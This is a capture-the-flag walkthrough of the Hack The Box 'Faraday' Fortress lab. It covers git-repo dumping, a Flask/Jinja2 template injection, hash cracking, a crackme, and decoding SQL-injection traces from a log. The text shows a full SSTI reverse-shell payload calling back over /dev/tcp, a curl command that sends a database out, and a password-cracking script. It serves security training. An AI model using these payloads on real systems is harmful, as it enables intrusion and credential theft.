***
![](./Images/_cover_full.jpg)
![](./Images/_faradaylogo.png)
[HTB] Faraday Fortress
====
***
***
![XploitOverload](./Images/profile-modified.png)
XploitOverload
===
***


# Challenge Info

This Fortress, created by Faraday, was designed not only as a puzzle, but mainly as a tool to learn: a server’s alert system has been hacked, your task is to use your skills to find out exactly how they did it, and to take advantage of this knowledge in order to hack the system yourself. The idea behind the Fortress is that security is not only about knowing, it’s about being able to learn what you need, when you need to. To be a hacker means not only a set of skills, but also an attitude towards learning. To conquer the Fortress, participants will need to exercise the following abilities: Web Exploitation Lateral thinking Networking You’ll also be able to get an introduction to reverse engineering and binary exploitation, crucial skills to face complex problems. “Hack the box has been a gateway for learning in new, unconventional ways, in line with the principles of the hacker community. Our fortress was designed to do exactly that: practice learning from another hacker’s activity in a challenging environment”. Says Javier Aguinaga, Security Research Lead at Faraday. “Faraday conceives cyber security as an integrated ecosystem, and it’s main goal is to improve the security environment for all the community. Collaborating with the formation of new hackers is part of our mission, and Hack the Box is the perfect ally”. Confronting this fortress will be a great opportunity to become a better hacker. Conquering it will allow you to stand out.

# Overview
- Recon
  - Nmap
- Enumeration
  - Git Repo
  - Web
- Exploitation
  - IDOR
  - Initial access
  - Password Spraying
- Post Enumeration
  - Getting Shell
  - Administartor Shell
    - Lateral Movement
- Priv Escalation
- Rootkit

# Recon
## Nmap

```bash
# Nmap 7.94SVN scan initiated Sun May 11 18:53:51 2025 as: nmap -vv -sC -sV -oN nmap/intial T4 10.13.37.14
Failed to resolve "T4".
Nmap scan report for 10.13.37.14
Host is up, received echo-reply ttl 63 (0.59s latency).
Scanned at 2025-05-11 18:53:53 IST for 89s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a8:05:53:ae:b1:8d:7e:90:f1:ea:81:6b:18:f6:5a:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCn+OBVZ8aW1WpHnk2y+RBJfAAjWWc8wtiMWv4EF/TnNALqXgClmpRGHQYyJy7q43WCzhAfsYJorggsyTRW6HNnXnB4U+PZhmn90wl5DX4GJUWQH3S1PH0x0hMQ+8bDt/qe9Anw2ZB6pSEJX0istdOnihiVoZIlwpfHESxm8oXC05hgvL1BIFHTauntV+YnnqgkJ0rJU5r9qoPMdUyUSf+x7Ao+GVW0KOqhWjJnfV4gDgBJrQyMYmida7O8iOam9tdgMee4JqPyPH/RTiCBr+vVmfAXxK3GRxMBrOxoqyouWTEXQsmQlkvubmBFSzdwkIg7bhVkDmRLBB1VIprSkuWDanQ/6TRg3EDJ1PN+9uiZLsDVYP0399c7gNZEBheeMSaXL1NsH/VIGJL2eQsOVtWYN5yHw15KzCQ2TaXYw07A5ThbXAukGO+xwCfpLHzJPSwtzxCaW4RpQ7yYUk3tCgBcGQmO1i9gDT8KFogiWAEjDRQI9lFKl8SYkQ90NwYXvK8=
|   256 2e:7f:96:ec:c9:35:df:0a:cb:63:73:26:7c:15:9d:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFj0dK19uhVUDpnZEaNhITtRBIBZU46rEw4cRP6yp6A8xBYRGKVa1HSf9C96sXPqw86J/nphdkt1ZTxrrhvOuZ0=
|   256 2f:ab:d4:f5:48:45:10:d2:3c:4e:55:ce:82:9e:22:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGgy3Ea/mMDIcLku2KNKVYbbvYJVIhvhoL3rRXoxdii6
80/tcp   open  http            syn-ack ttl 62 nginx 1.13.12
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-git: 
|   10.13.37.14:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Add app logic & requirements.txt 
| http-title: Notifications
|_Requested resource was http://10.13.37.14/login?next=%2F
|_http-server-header: nginx/1.13.12
8888/tcp open  sun-answerbook? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, LSCP, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to FaradaySEC stats!!!
|     Username: Bad chars detected!
|   NULL: 
|     Welcome to FaradaySEC stats!!!
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.94SVN%I=7%D=5/11%Time=6820A4F7%P=x86_64-pc-linux-gnu%r
SF:(NULL,29,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20")%r(Ge
SF:tRequest,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\
SF:x20chars\x20detected!")%r(HTTPOptions,3C,"Welcome\x20to\x20FaradaySEC\x
SF:20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(FourOhFourReques
SF:t,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20char
SF:s\x20detected!")%r(JavaRMI,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\
SF:nUsername:\x20Bad\x20chars\x20detected!")%r(LSCP,3C,"Welcome\x20to\x20F
SF:aradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Gener
SF:icLines,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x
SF:20chars\x20detected!")%r(RTSPRequest,3C,"Welcome\x20to\x20FaradaySEC\x2
SF:0stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(RPCCheck,3C,"Welc
SF:ome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detec
SF:ted!")%r(DNSVersionBindReqTCP,3C,"Welcome\x20to\x20FaradaySEC\x20stats!
SF:!!\nUsername:\x20Bad\x20chars\x20detected!")%r(DNSStatusRequestTCP,3C,"
SF:Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20d
SF:etected!")%r(Help,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername
SF::\x20Bad\x20chars\x20detected!")%r(SSLSessionReq,3C,"Welcome\x20to\x20F
SF:aradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Termi
SF:nalServerCookie,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\
SF:x20Bad\x20chars\x20detected!")%r(TLSSessionReq,3C,"Welcome\x20to\x20Far
SF:adaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Kerbero
SF:s,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20char
SF:s\x20detected!")%r(SMBProgNeg,3C,"Welcome\x20to\x20FaradaySEC\x20stats!
SF:!!\nUsername:\x20Bad\x20chars\x20detected!")%r(X11Probe,3C,"Welcome\x20
SF:to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%
SF:r(LPDString,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20B
SF:ad\x20chars\x20detected!")%r(LDAPSearchReq,3C,"Welcome\x20to\x20Faraday
SF:SEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(LDAPBindReq
SF:,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars
SF:\x20detected!");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 11 18:55:22 2025 -- 1 IP address (1 host up) scanned in 91.36 seconds

```

By initial recon we found port `22`, `80` and `8888` are running on service. Also 'nmap script' found that `Git` repository on service and it run websever with some python environment cause it also found last commit msg indicating `python-app` and `requirements.txt`. Other than this script got that port `8888` is used for listening service such as 'msg' from `webserver`.

# Enumeration

## Git Repo Analysis

`Nmap` found git repo at `http:///10.13.37.14/.git`. So I decide to see the repo first. We need to dump the repo using `git-dumper`. By seeing the content of `requirements.txt` we got intersting information that web server is running `jinja2`, `sql`, `werkzeug` and `flask` which markable vulnerable services.
```bash
git-dumper http://10.13.37.14/.git /git_repo
```
![.\Images\git_repo.png](./Images/git_repo.png)

Afterward, look into the `app.py` and here we got all what we want. So i this code I found that it uses `werkzeug` library to generate `password hash` and store in `sqlite3` database. Otherthan this found that parameter `name` in `/profile` take anything as input and redirected to `/sendMessage` taht sends data to the server `SMTP`, there is a vulnerability that is obvious and it is the use of `render_template_string`when sending data to the server.

```python
#!/usr/bin/env python3
from flask import Flask, request, g, render_template, render_template_string, Response, send_from_directory
from flask import redirect, url_for
from flask_mail import Mail, Message

from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin, LoginManager, login_required, current_user, logout_user, login_user

import sqlite3
import os
import smtplib


app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ['SECRET_KEY']
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db/database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

template = '''
An event was reported at SERVER:
{{ message }}
Here is your gift {{ tinyflag }}
'''

db = SQLAlchemy(app)

db.init_app(app)

login = LoginManager()
login.init_app(app)
login.login_view = 'login'

@login.user_loader
def load_user(id):
    return UserModel.query.get(int(id))

class UserModel(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(80), nullable=False, unique=True)
    username = db.Column(db.String(100), nullable=False, unique=True)
    password_hash = db.Column(db.String(), nullable=False)
    config = db.relationship('SmtpConfig', backref='owner', lazy=True)
    message = db.relationship('MessageModel', backref='sender', lazy=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password, "sha256")
    
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class SmtpConfig(db.Model):
    server_id = db.Column(db.Integer, primary_key=True)
    host = db.Column(db.String(100), nullable=False)
    port = db.Column(db.Integer, nullable=False)
    smtp_username = db.Column(db.String(100), nullable=False)
    smtp_password = db.Column(db.String(), nullable=False)
    use_tls = db.Column(db.Boolean)
    use_ssl = db.Column(db.Boolean)
    user_id = db.Column(db.Integer, db.ForeignKey('user_model.id'), nullable=False)

class MessageModel(db.Model):
    message_id = db.Column(db.Integer, primary_key=True)
    server = db.Column(db.String(256))
    dest = db.Column(db.String(100))
    subject = db.Column(db.String(100))
    body = db.Column(db.String(100))
    user_id = db.Column(db.Integer, db.ForeignKey('user_model.id'), nullable=False)

@app.before_first_request
def create_table():
    db.create_all()

@app.teardown_appcontext
def close_connection(exception):
    db.session.close()
    db.get_engine(app).dispose()

@app.route('/sendMessage', methods=['POST', 'GET'])
@login_required
def sendMessage():
    if request.method == "POST":
        if current_user.config and current_user.message:
            smtp = current_user.config[0]
            message = current_user.message[0]
            message.dest = request.form['dest']
            message.subject = request.form['subject']
            message.body =  "Subject: %s\r\n" % message.subject + render_template_string(template.replace('SERVER', message.server), message=request.form['body'], tinyflag=os.environ['TINYFLAG'])
            db.session.commit()
            try:
                server = smtplib.SMTP(host=smtp.host, port=smtp.port)
                if smtp.smtp_username != '':
                    server.login(smtp.smtp_username, smtp.smtp_password)
                server.sendmail('no-reply@faradaysec.com', message.dest, message.body)
                server.quit()
            except:
                return render_template('bad-connection.html')
        elif not current_user.config:
            return redirect('/configuration')
        else:
            return redirect('/profile')
    
    return render_template('sender.html')

@app.route('/profile')
@login_required
def profile():
    name = request.args.get('name', '')
    if name:
        if not current_user.message:
            message = MessageModel(server=name, user_id=current_user.id)
            db.session.add(message)
            db.session.commit()
        else:
            current_user.message[0].server = name
            db.session.commit()
        return redirect('/sendMessage')

    return render_template('base.html')

@app.route('/configuration', methods=['POST', 'GET'])
@login_required
def config():
    if request.method == 'POST':
        if not current_user.config:
            host = request.form['host']
            port = request.form['port']
            smtp_username = request.form['username']
            smtp_password = request.form['password']
            use_tls = "use_tls" in request.form
            use_ssl = "use_ssl" in request.form

            conf = SmtpConfig(
                host=host,
                port=port,
                smtp_username=smtp_username,
                smtp_password=smtp_password,
                use_tls=use_tls,
                use_ssl=use_ssl,
                user_id=current_user.id
                )
            db.session.add(conf)
            db.session.commit()
        else:
            current_user.config[0].host = request.form['host']
            current_user.config[0].port = request.form['port']
            current_user.config[0].smtp_username = request.form['username']
            current_user.config[0].smtp_password = request.form['password']
            current_user.config[0].use_tls = "use_tls" in request.form
            current_user.config[0].use_ssl = "use_ssl" in request.form
            db.session.commit()

        return render_template('conf-saved.html')
    else:
        if current_user.config:
            return render_template(
                'conf.html',
                host=current_user.config[0].host,
                port=current_user.config[0].port,
                username=current_user.config[0].smtp_username,
                password=current_user.config[0].smtp_password,
                use_tls=current_user.config[0].use_tls,
                use_ssl=current_user.config[0].use_ssl
                )
        return render_template('conf.html')

@app.route('/')
@login_required
def index():
    if current_user.is_authenticated and current_user.config:
        return redirect('/profile')
    elif current_user.is_authenticated:
        return redirect('/configuration')

    return redirect('/login')

@app.route('/login', methods=['POST', 'GET'])
def login():
    if current_user.is_authenticated:
        if not current_user.config:
            return redirect('/configuration')
        else:
            return redirect('/profile')
    
    if request.method == 'POST':
        username = request.form['username']
        user = UserModel.query.filter_by(username = username).first()
        if user is not None and user.check_password(request.form['password']):
            login_user(user)
            if not current_user.config:
                return redirect('/configuration')
            else:
                return redirect('/profile')
    
    return render_template('login.html')

@app.route('/signup', methods=['POST', 'GET'])
def signup():
    if current_user.is_authenticated:
        return redirect('/profile')
    
    if request.method == 'POST':
        email = request.form['email']
        username = request.form['username']
        password = request.form['password']

        email_exists = UserModel.query.filter_by(email=email).first()
        username_exists =UserModel.query.filter_by(username=username).first()
        
        if email_exists and username_exists:
            return render_template('register.html', bad_email=True, bad_username=True)

        if email_exists:
            return render_template('register.html', bad_email=True)

        if username_exists:
            return render_template('register.html', bad_username=True)
        
        user = UserModel(email=email, username=username)
        user.set_password(password)
        db.session.add(user)
        db.session.commit()
        return redirect('/configuration')

    return render_template('register.html')

@app.route('/logout')
def logout():
    logout_user()
    return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000, debug=True)

```



## Web

As we seen port`80` running a webserver which run `http://10.13.37.14/login?next=%2F` by default. The web service presents a login page requesting credenciales.

![](./Images/web1.png)

We dont have any login `creds`. However, user `registration` is enabled, potentially allowing account creation and further access to the application. This could be leveraged for enumeration, privilege escalation, or other attack vectors. So I used `deadbeef`:`deadbeef` to register on web for further movement.

Now we can login the user we created by using `creds` which we registered.

After logging in, we were asked to configure an `SMTP` server that would receive system alerts. We set up our own `host` with port `25`, which could allow us to intercept or manipulate the emails sent by the system.

![](./Images/web3.png)

After configuration, setuping our host.
```bash
python3 -m aiosmtpd -n -l 10.10.16.4:25
```
When we send the alert we recieve a msg in our terminal and here got our gift.
![](./Images/flag1.png)

### Warmup
```FARADAY{ehlo_@nd_w3lcom3!}```

# Exploitation

## IDOR
As mention in `app.py`,
```python
@app.route('/profile')
@login_required
def profile():
    name = request.args.get('name', '')
    if name:
        if not current_user.message:
            message = MessageModel(server=name, user_id=current_user.id)
            db.session.add(message)
            db.session.commit()
        else:
            current_user.message[0].server = name
            db.session.commit()
        return redirect('/sendMessage')

    return render_template('base.html')
```
we can test a basic payload for `SSTI`what `{{7*7}}`this is by pointing it in the URL `/profile`with the parameter `name`like this
```
http://10.13.37.14/profile?name={{7*7}} 
```
![](./Images/web4.png)
When we open it in the browser it redirects us to `/sendMessage`.
![](./Images/web5.png)
When receiving the alert found that `{{` is deleted so the response is not represented `output`as expected.

```bash
python3 -m aiosmtpd -n -l 10.10.16.4:25
---------- MESSAGE FOLLOWS ----------
Subject: deadbeef
X-Peer: ('10.13.37.14',48780)
    
An event was reported at 7*7}}
Here is your gift FARADAY{ehlo_@nd_w3lcom3!}  
------------ END MESSAGE ------------
```

Now we are on right track, so use Jinja2 injection for RCE to get a reverse shell via `os.popen`
[Jinja2 RCE](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) payload with reverse shell

```
{% if request['application']['__globals__']['__builtins__']['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.4/443 0>&1"').read() == 'chiv' %}a{% endif %}
```

URL Encoded which will get decoded by raw Jinja2
```
http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os').popen('bash+-c+"bash+-i+%3E%26+/dev/tcp/10.10.16.4/443+0%3E%261"').read()+%3D%3D+'chiv'+%25}a{%25+endif+%25}
```
![](./Images/web6.png)

## Initial access
```bash                                 
┌──(root㉿kali)-[/home/kali/HTB/fortress/faraday]
└─# rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.13.37.14] 35622
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@98aa0f47eb96:/app# ls -la
ls -la
total 52
drwxr-xr-x 1 root root 4096 Jul 21  2021 .
drwxr-xr-x 1 root root 4096 Jul 21  2021 ..
drwxr-xr-x 8 root root 4096 Jul 16  2021 .git
drwxr-xr-x 2 root root 4096 Jul 21  2021 __pycache__
-rwxr-xr-x 1 root root 8523 Jul 21  2021 app.py
drwxr-xr-x 2 root root 4096 May 12 07:54 db
-rw-r--r-- 1 root root   30 Jul 16  2021 flag.txt
-rw-r--r-- 1 root root  220 Jul 16  2021 requirements.txt
drwxr-xr-x 3 root root 4096 Jul 16  2021 static
drwxr-xr-x 2 root root 4096 Jul 21  2021 templates
-rw-r--r-- 1 root root   71 Jul 16  2021 wsgi.py
root@98aa0f47eb96:/app# cat flag.txt
cat flag.txt
FARADAY{7x7_1s_n0t_@lw4ys_49}
root@98aa0f47eb96:/app# id 
id 
uid=0(root) gid=0(root) groups=0(root)
root@98aa0f47eb96:/app# cd db
cd db
root@98aa0f47eb96:/app/db# ls -la
ls -la
total 32
drwxr-xr-x 2 root root  4096 May 12 07:54 .
drwxr-xr-x 1 root root  4096 Jul 21  2021 ..
-rw-r--r-- 1 root root 24576 May 12 07:54 database.db
root@98aa0f47eb96:/app/db# which curl
which curl
/usr/bin/curl
root@98aa0f47eb96:/app/db# curl -F 'file=@database.db' http://10.10.16.4:9999
curl -F 'file=@database.db' http://10.10.16.4:9999
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 24793  100    14  100 24779      8  14391  0:00:01  0:00:01 --:--:-- 14398
File uploaded
```
Here we got our third flag.
### Let's count
```FARADAY{7x7_1s_n0t_@lw4ys_49}```

Otherthan, that found `database.db`, which contains `usernames`, `password-hash` and their `email` as we seen in `app.py`. So for analyzing it we need to upload `database.db` to our local machine using `curl` and `flask` as `nc` and `ssh` not available.

```python
#upload_server.py
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def upload_file():
    f = request.files['file']
    f.save(f.filename)
    return 'File uploaded\n'

app.run(host='0.0.0.0', port=9999)
```
![](./Images/upload_server.png)

using `DB Browser for SQLite` we got interesting things as above mentioned.

[](./Images/sqlite3db.png)

## Password Spraying
We need to store hashes in `usernames`:`hash` this format to crack it. In `app.py` it is mentioned that `pass_hash` is generated using `werkzeug.security` library. So we just need to apply reverse logic here to crack the passwords. 
- [Werkzeug Algorithm](https://tedboy.github.io/flask/generated/werkzeug.generate_password_hash.html)
- [Werkzeug Cracker](https://github.com/AnataarXVI/Werkzeug-Cracker)
```bash                                 
┌──(root㉿kali)-[/home/kali/HTB/fortress/faraday]
└─#cat hashes
administrator:sha256$GqgROghu45Dw4D8Z$5a7eee71208e1e3a9e3cc271ad0fd31fec133375587dc6ac1d29d26494c3a20f
octo:sha256$gqsmQ2210dEMufAk$98423cb07f845f263405de55edb3fa9eb09ada73219380600fc98c54cd700258
pasta:sha256$MsbGKnO1PaFa3jhV$6b166f7f0066a96e7565a81b8e27b979ca3702fdb1a80cef0a1382046ed5e023
root:sha256$L2eaiLgdT73AvPij$dc98c1e290b1ec3b9b8f417a553f2abd42b94694e2a62037e4f98d622c182337
pepe:sha256$9NzZrF4OtO9r0nFx$c3aa1b68bea55b4493d2ae96ec596176890c4ccb6dedf744be6f6bdbd652255d
nobody:sha256$E2bUlSPGhOi2f5Mi$2982efbc094ed13f7169477df7c078b429f60fe2155541665f6f41ef42cd91a1
asmo:sha256$SdpVTKrkEq4WtmdB$09a9354a8b8a5ee003c651755d41cb8dae240f2ae176c9fa03d1facf726b6ea7
asdfghhh:sha256$C7XgkKsp69BS3nRs$98aa0c171fd39c673b4fa9be9b1114ec3e217ae8d16ce62b0a4833d00de59625
magica:sha256$YT7AQZ5Y51lKQj97$ceacba60ca81c17217f9cdf8c5aa6830d04da84c2a49a5b9368dad5b1a2879c6
deadbeef:sha256$k6VedFRKvSiKhMHV$b77904daad330b304b8f15690883a853b22a986744760d861dfe77ff3e8106df

```
Created a python script that `generate pass_hash` from `wordlist` and `compare` to the `pass_hash` if it verifies then we will get our passwords.
```python
import hmac, hashlib

with open("hashes") as f:
    user_hashes = [line.strip().split(":") for line in f if line.strip()]

print(f"[+] Loaded {len(user_hashes)} hashes")

for user, full_hash in user_hashes:
    algo, salt, target = full_hash.split("$")
    if algo != "sha256":
        print(f"[-] Skipping {user}, unsupported algo {algo}")
        continue

    print(f"[>] Cracking password for user: {user}")

    with open("/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt", "r", encoding="latin-1", errors="ignore") as wl:
        for word in wl:
            pw = word.strip()
            guess = hmac.new(salt.encode(), pw.encode(), hashlib.sha256).hexdigest()
            if guess == target:
                print(f"[✔] Found for {user}: {pw}")
                break
        else:
            print(f"[✘] No match found for {user}")

```

![](./Images/crack_hashes.png)


So now we got the passwords of all the users which we must need to know. So now going back to port `8888` where we can test the 'passwords`.

![](./Images/8888_1.png)
 and here we got the flag
![](./Images/8888_2.png)

### Hidden pasta
```FARADAY{C_1s-0ld-Bu7_n0t-0bs0|3te}```

# Post Enumeration


## Getting Shell

We logged into another user `pasta`:`antihacker` which is valid `creds` for ssh.

![](./Images/pasta.png)

We downloaded `crackme` binary using `scp` for `reversing`.

Executing `crackme` take an input as a flag and returns nothing for wrong flag.
```bash                                                     
┌──(root㉿kali)-[/HTB/fortress/faraday]
└─# ./crackme
Insert flag: FARADAY{ehlo_@nd_w3lcom3!}
```
Using [Ghidra](https://ghidra-sre.org/) we decompiled it and got `c like pseudo code`. Analyzed `main` function and every other `function`. But we got flag in `main`. 

![](./Images/ghidra.png)
![](./Images/ghidra2.png)

```C
undefined8 main(void)

{
undefined1 uVar1;
long in\_FS\_OFFSET;
double dVar2;
double dVar3;
int local\_38;
int local\_34;
int local\_30;
int iStack\_2c;
int local\_28;
undefined2 uStack\_24;
ushort uStack\_22;
char local\_20;
undefined2 uStack\_1f;
undefined4 uStack\_1d;
undefined1 uStack\_19;
long local\_10;

local\_10 = \*(long \*)(in\_FS\_OFFSET + 0x28);
\_\_printf\_chk(1,"Insert flag: ");
\_\_isoc99\_scanf(\&DAT\_00102012,\&local\_38);
uVar1 = (undefined1)uStack\_1d;
uStack\_22 = uStack\_22 << 8 | uStack\_22 >> 8;
uStack\_1d = CONCAT31(uStack\_1d.*1\_3*,uStack\_19);
uStack\_19 = uVar1;
if ((((local\_38 == 0x41524146) && (local\_34 == 0x7b594144)) && (local\_30 == 0x62753064)) &&
(((iStack\_2c == 0x405f336c && (local\_20 == '\_')) &&
((local\_28 == 0x665f646e && (CONCAT22(uStack\_22,uStack\_24) == 0x40746f31)))))) {
dVar2 = (double)CONCAT26(uStack\_22,CONCAT24(uStack\_24,0x665f646e));
dVar3 = (double)CONCAT17(uVar1,CONCAT43(uStack\_1d,CONCAT21(uStack\_1f,0x5f)));
\_\_printf\_chk(0x405f336c62753064,1,\&DAT\_00102017);
\_\_printf\_chk(dVar2,1,"y: %.30lf\n");
\_\_printf\_chk(dVar3,1,"z: %.30lf\n");
dVar2 = dVar2 \* 124.80349027103654;
dVar3 = (dVar2 \* dVar2) / dVar3;
round\_double(dVar3,0x1e);
\_\_printf\_chk(1,"%.30lf\n");
dVar2 = (double)round\_double(dVar3,0x1e);
if (1.1920928955078125e-07 <= ABS(dVar2 - 4088116.817143337)) {
puts("Try Again");
}
else {
puts("Well done!");
}
}
if (local\_10 != \*(long *)(in\_FS\_OFFSET + 0x28)) {
/* WARNING: Subroutine does not return \*/
\_\_stack\_chk\_fail();
}
return 0;
}

```
In `main` function main condition is defined. All the comparisons are in `hex` so we decode it.
```C
//main condition
if ((((local_38 == 0x41524146) && (local_34 == 0x7b594144)) && (local_30 == 0x62753064)) &&
 (((iStack_2c == 0x405f336c && (local_20 == '_')) &&
  ((local_28 == 0x665f646e && (CONCAT22(uStack_22,uStack_24) == 0x40746f31))))))
```
| Variable                | Hex Value    | ASCII equivalent |
| ----------------------- | ------------ | ---------------- |
| `local_38`              | `0x41524146` | `"FARA"`         |
| `local_34`              | `0x7b594144` | `"DAY{"`         |
| `local_30`              | `0x62753064` | `"d0ub"`         |
| `iStack_2c`             | `0x405f336c` | `"l3_@"`         |
| `local_28`              | `0x665f646e` | `"nd_f"`         |
| `uStack_24`+`uStack_22` | `0x40746f31` | `"1ot@"`         |
| `local_20`              | `'_'`        |                  |

Putting all together we got
```bash
FARADAY{d0ubl3_@nd_f1o@t_
```
Upon analyzing flag have 3 `variables`. And we got `var1` so others part of flag is missing, so it is not full flag.

`var2` and `var3` are obfuscated and treated as bytes doubles. This clearly meant that last part of the flag is being interpreted as bytes → float → math.
```C
dVar2 = (double)CONCAT26(uStack\_22,CONCAT24(uStack\_24,0x665f646e));
dVar3 = (double)CONCAT17(uVar1,CONCAT43(uStack\_1d,CONCAT21(uStack\_1f,0x5f)));

dVar2 = dVar2 \* 124.80349027103654;
dVar3 = (dVar2 \* dVar2) / dVar3;
round\_double(dVar3,0x1e);
```
This swaps byte 3 and 7 of an 8-byte float — a classic obfuscation trik. So actual float bytes are stored scrambled, and must be unscrambled.
```C
uStack_1d = CONCAT31(uStack_1d._1_3_, uStack_19);
uStack_19 = uVar1;
```
Our goal is find flag bytes that, when converted to a double and inserted into the math logic, yield `4088116.817143337`
```C
if (ABS(dVar2 - 4088116.817143337) <= ε)
    puts("Well done!");
```

So we bruteforced it where the byte of the double is _ and the characters `3` and `7` are exchanged, this until the condition is met.

```python
from itertools import product
import struct, string

flag = "FARADAY{d0ubl3_@nd_f1o@t_"

characters = string.ascii_lowercase + string.punctuation

for combination in product(characters, repeat=5):
    chars = "".join(combination).encode()
    try:
        value = b"_" + chars[:2] + b"}" + chars[2:] + b"@"
        packed = struct.unpack("d", value)[0]
        result = 1665002837.488342 / packed

        if abs(result - 4088116.817143337) <= 0.0000001192092895507812:
            final_part = chars[:2] + b"@" + chars[2:] + b"}"
            final_flag = flag + final_part.decode()
            break
    except:
        continue

final_flag if 'final_flag' in locals() else "No match found."
```
Upon executing this script we got the flag

```bash
┌──(root㉿kali)-[/home/kali/HTB/fortress/faraday]
└─# python3 rev_crackme.py
'FARADAY{d0ubl3_@nd_f1o@t_be@uty}'
```
### Time to play
```FARADAY{d0ubl3_@nd_f1o@t_be@uty}```
```bash                                                     
┌──(root㉿kali)-[/HTB/fortress/faraday]
└─# ./crackme
Insert flag: FARADAY{d0ubl3_@nd_f1o@t_be@uty} 
x: 124.803490271036537251347908750176
y: 326.949560520769296090293209999800
z: 407.278684040100358743075048550963
4088116.817143336869776248931884765625
Well done!
```

# Administrator Shell

So now we logged into `administrator` account using `ssh` for further enumeration and priv escalation. 

## Lateral Movement

We gain access to `root` by using default `creds` `root`:`kali`.

![](./Images/admin_priv_esc1.png)

In searching of suid, executables and binaries we got files about `/update.php` and `sqlmap` and `access.log`.

![](./Images/admin_priv_esc3.png)

![](./Images/admin_priv_esc2.png)

![](./Images/admin_priv_esc4.png)

Here we got `GET` request which takes input at `keyword` parameter and execute `python`which is vulnerable. And it url encoded so we decoded using [Url-Decoder](https://www.urldecoder.org/)
![](./Images/url_decoder.png)

Here is decoded url and we got interesting pattern that is `))` is followed by `ascii numbers`. So we just take that part and decode it using a simple python script.

```url
/update.php?keyword=python' WHERE 1388=1388 AND (SELECT 7036 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6d7973716c LIMIT 28,1),3,1))>110,0,3)))))pqBK)-- EZas&text=python3HTTP/1.1"200327"http://192.168.86.128:80/update.php
```
```bash
root@erlenmeyer:/home/administrator# cat << EOF > exploit.py
> #!/usr/bin/python3
> import re, urllib.parse
> 
> with open("/var/log/apache2/access.log") as file:  
>     for line in file:
>         line = urllib.parse.unquote(line)
>         if not "update.php" in line:
>             continue
>         regex = re.search("\)\)!=(\d+)", line)
>         if regex:
>             decimal = int(regex.group(1))
>             print(chr(decimal), end="")
> EOF
```

After executing `exploit.py` we got readable text and found the hidden flag.

![](./Images/admin_priv_esc5.png)
### Read Carefully
```FARADAY{@cc3ss_10gz_c4n_b3_use3fu111}```

![](./Images/admin_priv_esc6.png)

# Priv Escalation
```bash
┌──(root㉿kali)-[/home/kali/HTB/fortress/faraday]
└─# ssh administrator@10.13.37.14
administrator@10.13.37.14's password: 

  System load:                      0.01
